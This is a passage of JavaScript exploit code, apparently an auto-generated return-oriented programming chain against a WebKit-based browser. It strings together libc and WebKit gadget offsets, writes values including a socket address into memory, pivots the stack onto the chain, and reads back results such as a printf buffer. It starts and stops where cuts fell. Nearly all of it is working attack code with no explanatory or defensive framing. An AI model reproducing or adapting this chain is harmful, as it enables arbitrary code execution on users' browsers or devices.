libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+225585, //mov rax, [rdi]
libc_base+764760 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+763368 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+14664103, //and rax, rcx
libc_base+763368, //pop rcx
socket_addr,
webkit_base+20307877, //mov [rax], rcx
libc_base+764760 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+731401, //mov rax, r8
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+426295, //mov [rdi], rax
libc_base+764760 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+201260, //sub rdi, rsi ; mov rdx, rdi
libc_base+384176, //mov rax, rdi
libc_base+764760, //pop rsi
ropchain+1207272, //L3481
webkit_base+660161, //mov [rsi], rax ; mov al, 1
libc_base+782311 //pop rsp
]);
//L3481:
db([0, 0]); // 0x0
//L2632:
db([2, 0, 0, 0, 0, 0]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
